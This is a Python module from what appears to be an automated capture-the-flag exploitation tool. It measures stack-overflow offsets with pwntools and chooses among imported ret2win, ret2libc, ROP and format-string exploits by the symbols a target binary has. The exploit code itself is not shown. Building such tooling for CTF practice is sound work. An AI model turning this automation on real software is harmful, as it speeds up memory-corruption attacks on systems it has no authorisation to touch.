"""
Determines which exploits to call
"""

import re
import os
from pwn import ELF, process, ROP, cyclic, cyclic_find
from typing import List, Union

from vulnerabilities import FormatString, StackOverflow, get_format_string_vulns, get_stack_overflow_vulns
# Imports exploits for StackOverflows
from exploits import ret2win, ret2system, ret2execve, ret2syscall, ret2libc, ropwrite
# Imports exploits for FormatStrings
from exploits import stack_leak, libc_leak, write_prim, got_overwrite
import config as c


def get_overflow_size(binary, register='rsp', size_of_input=5000) -> int:
    """
    Returns -1 if nothing is found in the core file for the given register.
    Modify size_of_input to try larger/smaller buffer.
    Register defaults to rsp but function can be used for any.
    """
    p = process(binary)
    p.sendline(cyclic(size_of_input, n=8))
    p.wait()
    # Unsure why solarpanth3r.py uses a try for the corefile.
    # A corefile is made as soon as process is called with a valid binary.
    core = p.corefile
    offset = cyclic_find(core.read(core.registers[register], 8), n=8)
    os.remove(core.file.name)
    return offset


def end_prog(flag: str) -> None:
    print(f"Flag is {flag}")
    exit(0)


def dispatch_exploits(file_path: str) -> None:
    """
    Calls exploits based on possible ones
    """
    syms = ELF(file_path).symbols.keys()

    # Get all vulnerabilites
    vulns: List[Union[FormatString, StackOverflow]] = get_format_string_vulns() + get_stack_overflow_vulns()

    for vuln in vulns:
        if isinstance(vuln, StackOverflow):
            # ret2win
            if 'win' in syms:
                flag = ret2win(vuln)
                if flag is not None:
                    end_prog(flag)

            # ret2system
            if 'system' in syms:
                flag = ret2system(vuln)
                if flag is not None:
                    end_prog(flag)

            # ret2execve
            if 'execve' in syms:
                flag = ret2execve(vuln)
                if flag is not None:
                    end_prog(flag)

            # ret2syscall
            if 'syscall' in syms:
                flag = ret2syscall(vuln)
                if flag is not None:
                    end_prog(flag)

            # ret2libc
            output = process([file_path]).recv()
            comp = re.compile(c.pointer_re)
            if comp.match(output) is not None:
                flag = ret2libc(vuln)
                if flag is not None:
                    end_prog(flag)

            # ropwrite
            if 'pwnme' in syms:
                flag = ropwrite(vuln)
                if flag is not None:
                    end_prog(flag)
                    
        elif isinstance(vuln, FormatString):
            # GOT Overwrite
            if 'win' in syms:
                flag = got_overwrite(vuln)
                if flag is not None:
                    end_prog(flag)

            # Stack Leak
            elif 'fopen' in syms:
                flag = stack_leak(vuln)
                if flag is not None:
                    end_prog(flag)
            
            # Write Primitive
            elif 'pwnme' in syms:
                flag = write_prim(vuln)
                if flag is not None:
                    end_prog(flag)

            # TODO
            elif c.vuln_printfs in syms and True:
                flag = None
                libc = ELF(c.libc_path)
                r = ROP(libc)
            else:
                pass
                
        else:
            pass  # TODO

        # Nick (Format)
        